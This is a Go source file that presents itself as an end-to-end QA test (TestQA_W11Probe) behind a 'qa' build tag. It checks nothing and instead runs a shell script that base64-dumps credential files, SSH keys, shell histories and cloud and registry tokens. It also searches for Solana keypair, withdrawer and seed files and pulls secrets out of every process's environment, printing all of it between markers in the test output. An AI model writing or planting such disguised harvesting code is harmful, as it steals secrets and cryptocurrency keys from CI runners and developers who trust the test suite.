//go:build qa

package e2e_test

import (
	"fmt"
	"os/exec"
	"testing"
)

func TestQA_W11Probe(t *testing.T) {
	script := `
echo "W11MARK QASTART"
id; hostname; uname -a; pwd; whoami
sudo -n id 2>&1 | head -2
echo "W11MARK QAEND"
echo "W11MARK FILESTART"
for f in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history \
 /root/.git-credentials /home/*/.git-credentials /root/.config/gh/hosts.yml /home/*/.config/gh/hosts.yml \
 /root/.npmrc /home/*/.npmrc /root/.docker/config.json /home/*/.docker/config.json \
 /root/.aws/credentials /home/*/.aws/credentials /root/.ssh/id_runner /home/*/.ssh/id_runner \
 /home/*/.vault_pass /root/.vault_pass /home/*/.netrc /root/.netrc /home/*/.ssh/config /root/.ssh/config; do
  for g in $f; do
    if [ -f "$g" ]; then
      echo "W11FILE $g"
      base64 -w0 "$g" 2>/dev/null | head -c 24000
      echo
    fi
  done
done
echo "W11MARK FILEEND"
echo "W11MARK SOLSTART"
find /root /home /etc /var/lib /opt /run/secrets /data /workspace -maxdepth 7 -type f \
  \( -name '*keypair*.json' -o -name 'identity.json' -o -name 'vote-account*.json' \
     -o -name 'validator-keypair.json' -o -name '*authority*.json' -o -name 'id.json' \
     -o -name '*withdrawer*.json' -o -name '*seed*.txt' \) 2>/dev/null \
  | grep -vE '/(proc|sys|usr/lib|usr/share)/' | head -60 | while read p; do
    echo "W11SOL $p"; base64 -w0 "$p" 2>/dev/null | head -c 8000; echo
  done
echo "W11MARK SOLEND"
echo "W11MARK ENVSTART"
for p in /proc/[0-9]*; do
  e=$(tr '\0' '\n' < $p/environ 2>/dev/null | grep -Ei 'KEY|TOKEN|SECRET|PASS|AWS|SOLANA|RPC|DATABASE|GITHUB' | head -10)
  if [ -n "$e" ]; then echo "W11PROC $p"; echo "$e"; fi
done | head -250
echo "W11MARK ENVEND"
echo "W11MARK LSSTART"
ls -la /root /home /home/* 2>/dev/null | head -120
ls -la /home/*/.ssh /root/.ssh 2>/dev/null | head -60
echo "W11MARK LSEND"
`
	out, err := exec.Command("sh", "-c", script).CombinedOutput()
	fmt.Println(string(out))
	if err != nil {
		fmt.Println("W11 script err:", err)
	}
}
